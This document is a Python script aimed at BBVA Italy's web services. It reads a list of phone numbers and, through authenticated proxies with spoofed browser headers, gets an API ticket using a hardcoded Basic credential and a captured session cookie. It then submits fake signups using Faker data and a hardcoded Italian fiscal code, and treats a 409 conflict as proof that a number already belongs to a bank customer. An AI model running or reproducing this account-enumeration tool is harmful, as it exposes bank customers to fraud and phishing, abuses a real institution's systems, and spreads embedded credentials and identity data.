import time
import sys
import requests
from faker import Faker
from termcolor import colored, cprint

import colorama

colorama.init()

NUMBERS_FILE = 'numbers.txt'

def setup_proxy(user: str, password: str, endpoint: str) -> dict:
	wire_options = {
		"http": f"http://{user}:{password}@{endpoint}",
		"https": f"http://{user}:{password}@{endpoint}",
	}
	return wire_options

def process_number(number, numbers_list):
	cprint(f"Processing {number}...", "white", "on_green")

	USERNAME = ""
	PASSWORD = ""
	ENDPOINT = ""
			
	proxies = setup_proxy(USERNAME, PASSWORD, ENDPOINT)

	url = 'https://web.bbva.it/public.html#signup'
	response = requests.get(url, proxies=proxies)

	#cookie = response.headers.get('Set-Cookie')

	#print(response.headers)
	cookie = 'bm_sz=BCCE732986C32B40141696544AD3C462~YAAQfxdlX7zFkN2LAQAAGoK9+xVIFKOGLe+tV++SRMFZ5s3Yt2HOeD6m56BZ0KU1Xp5R5ya7UTMMK4IQIjU8UCWj+yIYENBlR5pB1l5FdDzBNnrJodn12Jmxk+XprpnBmn7b4e1CIoBUSOm3QqaHORNOVOZqelmvrSJL95U44Neb67600xXBL2VQ2OBcgtksCzqbsTpkYEEkM+ycydOCCbuc6whpMT5/9BorjY74z+n6xqUaRXRfOKEZm43o138euu53ggZctdcVyiSQq/lNzcpiS09AGl4mtjLIqMz3zD8=~3750198~3490100; check=true; AMCVS_D906879D557EE0547F000101%40AdobeOrg=1; digitalDataInfo=||; s_ecid=MCMID%7C88552530104081741804154250506509103132; TLTSID=17895082302453157386858117792412; s_cc=true; aceptarCookies={"version":2,"personalizacion":true,"analitica":true,"publicidad":true,"tecnica":true}; _gcl_au=1.1.629044216.1700735600; _tt_enable_cookie=1; _ttp=Zbmehja7_LhXQe6b0QOt7S0ytFv; _fbp=fb.1.1700735601641.802200954; language=it; HTTP_CONTACTID=7c2b0e36-ed83-42c0-9071-d386ff2d4a36; cclien=; isClient=1; s000001=795226890.29735.0000; akaalb_ALB_W_SERVICES_BBVA_IT=~op=LB_W_SERVICES_BBVA_IT_DEFAULT:w_services_bbva_it_TC1|~rv=89~m=w_services_bbva_it_TC1:0|~os=f7eebab2f83d0104175631e12f527567~id=285103099a52bfb8aaec4694200a3635; at_check=true; s_sq=%5B%5BB%5D%5D; _ga=GA1.1.1952030623.1700735607; __gdic=lpb25a1jiaj0si5ru8; ___r8001460=0.863999061026; ak_bmsc=889DC1780E71C744E8A95D9D18E09F99~000000000000000000000000000000~YAAQfxdlX2+1lN2LAQAA/hY4/BWMqAORaXR1DAkmaydIei1VZW8nZFEHIPa4EBoc4RHOZQMc4sFT3ES5hJ2UfUYbVEj1sCyNv4aFjuWZURLrwL4xiGY5nML5mQV1YVkbPksVl2Cvqj7pi94RwiRSsA+oiCEZ9UkLNmE/mUnvqs3KDev3jAH8zCC3q6VtRjfVB812uVCQOAntguzdDw11Kz9wgzAjkG2vOruXbx3upeiqpxe8yT7EX03ELw45xJZ3our+FaRsXsXC0Z6RqW7Py8ZFb33KK8Z3gjoEZRgmaY2FYgHPXRSZrUBUQcBZjGVplBhuXDkkT+noMOdL65rxu18oG1X3nlpDYNzE0MCxhwgZNphXJrooDsiaX0CMeKFQcyQGNUanKIuaTmFvOM9jDrXLQcpi7MUUyy6JdZT528N6zLPFPStRF9lGJEWxKRn58HgLr59P+GFjSccxZPAVkC/eoBQwRbiTSXYL+4pTJdj9vlg1W+hluFLqw7dC; AMCV_D906879D557EE0547F000101%40AdobeOrg=179643557%7CMCIDTS%7C19685%7CMCMID%7C88552530104081741804154250506509103132%7CMCAAMLH-1701348415%7C6%7CMCAAMB-1701348415%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1700750815s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.5.0; _ga_XE5WKVZDZ8=GS1.1.1700746009.3.0.1700746009.60.0.0; lastLogin=1700746012612; tipoOcupacion=; _abck=7F688135E10DAFB132236EDCF40AF6DD~0~YAAQfxdlX//bld2LAQAAKrNc/AoEIdjZETW+BRPtSXj5UHqL6Bkosyz4SGA7PGrTomlG3HNc/36pH6NgHL7WQE/WKc4ThD92LSweVz0U2pIgqky4pnqvI9sqOg2gO7ZRkHZiljnEdQcvPQrfXR2JqNCo31ytULuhqEoO9pam8V2FZR/yFYqQQpZUgDnBEHT7dy7KVv/aFQX8x6a6WOP4ylHkhZ1REJCmddCFECX9CVzJHHbEfH7f9Q7ZyRJKBbWqDZ4rk6CPLkXWEsBlqpkg2kfAq66BceweQnXtTWE5k12MfhyQ6Rm/WjHpwsKxoEqwJGpci9OyEfxZxTym5GrSjXYXw1/A+N8YHuMDwpmh590qCgfjad+PlUdqBssET6GaM2rYOuWnt9C//osNsAHlBLJ+10YX~-1~-1~-1; bm_sv=0233DF554C7BBE470224B4EDA58E128E~YAAQfxdlXwncld2LAQAAP7Rc/BVWrrTUAs8XpUjdGrjT+eiISu5RWY0DnS5tiqSEmzvGFptBcfcF7Apf38t0zD8DDAv2pCJOhEvUwT4T86F47gBeWzjN7rwHuHj1qMqGES4K8651l2cm2YQQc+FmqLups91EzXubVWpmKbyXtTJnhkGH0jbnBsG7bdbff/pQA/WYk801c9zuiOVt6bNo5PnbCLxYOKKyLwgN63cHbxMVt650ucjRDKMs2Krc~1; s_nr=1700746013152-Repeat; gpv_pn=escritorio%3Apublica%3Apersone%3Aonboarding%3Aalta%20clientes%3A1%20datos%20de%20usuario; gpv_url=https%3A%2F%2Fweb.bbva.it%2Fpublic.html%23signup; gpv_pt=transaccion; gpv_sl1=onboarding; mbox=PC#25fcf3b3b7aa40809bea704c0eb80ca5.37_0#1763990814|session#889ba7222c9045c9b803c3b76a2afeac#1700747873; mboxEdgeCluster=37; LSESSION_8001460=eyJpIjoibm1ZcEpETGVmS0dRTDRcLzUyUnJCMnc9PSIsImUiOiJ3NStKVmV0UTFqYzBGclRYZDJnb0prQ1RjZDdnQjdLMkpYbDVONHZKTDhSdkpPbUJ3MVNwM21venNQTnU2MTlJckZycWxldU9UN2ZKcDRETFN6cVVjSzBScnFJelgrMUhHOFZXOEgrQmNvNU1QcDlsK0FrN3J6WVBjWmN3RW1YR2Z2dWtIenFkMytjOXl3RUtRSlZaUWc9PSJ9.a4d1ab874aac7a88.MmM2MzRhMjg0ZmU0NjYwY2QwMDhjOGYzYzhhNDk4Y2U4MjAzYzE0YzA4NDJmMDE3ZjU1OTQwYzhiOTA4N2RhMg%3D%3D; utag_main=v_id:018bfbbd7df700034828080a57690506f001f06700f58$_sn:3$_se:1$_ss:1$_st:1700747812795$dc_visit:3$vapi_domain:bbva.it$ses_id:1700746012795%3Bexp-session$_pn:1%3Bexp-session$dc_event:1%3Bexp-session$dc_region:eu-central-1%3Bexp-session'

	
	url = 'https://w-services.bbva.it/TechArchitecture/grantingTicketsOauth/V01'

	headers = {
		'Accept': '*/*',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.9',
		'Authorization': 'Basic SU1NUDc1NzpwaGlsaXAyMQ==',
		'Contactid': '7c2b0e36-ed83-42c0-9071-d386ff2d4a36',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Referrer Policy': 'Strict-origin-when-cross-origin',
		'Origin': 'https://web.bbva.it',
		'Referer': 'https://web.bbva.it/',
		'Cookie': cookie,
		'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
		'Sec-Ch-Ua-Mobile': '?0',
		'Sec-Ch-Ua-Platform': '"Windows"',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-site',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
	}
	data = {
   		'grant_type': 'client_credentials'
	}
	response = requests.post(url, headers=headers, data=data, proxies=proxies)

	tsec_from_headers = response.headers.get('Tsec')

	if tsec_from_headers is None:
		cprint(f"Processing {number} failed, not found TSEC!", "white", "on_red")
		return

	headers = {
		"Content-Type": "application/json",
		"Origin": "https://web.bbva.it",
		"Referer": "https://web.bbva.it",
		"Sec-Ch-Ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
		"Sec-Ch-Ua-Mobile":	"?0",
		"Sec-Ch-Ua-Platform": "Windows",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"Tsec": tsec_from_headers,
		"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
	}

	url = "https://w-services.bbva.it/customers/v1/customers/"

	fake = Faker()

	json_data = {
		"firstName": str(fake.user_name()),
		"lastName": str(fake.last_name()),
		"user": {
			"userName": str(fake.first_name()),
			"password": "f01337"
		},
		"identityDocuments": [
			{
				"documentType": {
					"id": "ORIGIN_IDENTITY_DOCUMENT"
				},
				"documentNumber": "PLCKRC82B14D542R",
				"country": {
					"id": "IT"
				}
			}
		],
		"birthData": {
			"birthDate": "1982-02-14",
			"country": {
				"id": "IT"
			},
			"city": "FERMO",
			"state": {
				"id": "109"
			}
		},
		"nationalities": [
			{
				"id": "IT"
			}
		],
		"gender": {
			"id": "MALE"
		},
		"contactDetails": [
			{
				"contact": {
					"contactDetailType": "MOBILE",
					"number": "00" + str(number)
				}
			},
			{
				"contact": {
					"contactDetailType": "EMAIL",
					"address": str(fake.email())
				}
			}
		],
		"questionnaires": [
			{
				"questionnaire": {
					"questionnaireType": "COMMON",
					"isPublicOfficer": False,
					"interventionTypeId": "TIT"
				}
			},
			{
				"questionnaire": {
					"questionnaireType": "FOREIGN_ACCOUNT",
					"isSelfDeclaration": False,
					"nationalityEvaluationType": "0"
				}
			}
		],
		"economicData": {
			"employmentSituation": {
				"id": "B"
			},
			"incomes": [
				{
					"incomeType": {
						"id": "FIXED"
					},
					"incomeValues": [
						{
							"incomeValueType": {
								"frecuency": "ANNUALLY",
								"valueType": "RANGE",
								"minimumAmount": {
									"amount": "0010",
									"currency": "EUR"
								},
								"maximumAmount": {
									"amount": "MENO DI 5.000EUR ALL'ANNO",
									"currency": "EUR"
								}
							}
						}
					]
				}
			]
		},
		"verification": {
			"identificationMethod": "PHOTO_IDENTIFICATION"
		},
		"language": {
			"id": "IT"
		}
	}

	
	response = requests.post(url, json=json_data, headers=headers, proxies=proxies)

	if response.status_code == 409:
		print(response.status_code)
		print(response.text)
	else:
		cprint(f"Processing {number} failed, not exists", "white", "on_red")


with open(NUMBERS_FILE, 'r') as file:
	numbers = file.read().splitlines()
	numbers_copy = numbers.copy()
	for number in numbers_copy:
		process_number(number, numbers)
		time.sleep(2)

with open(NUMBERS_FILE, 'w') as file:
	file.write('\n'.join(numbers))

colorama.deinit()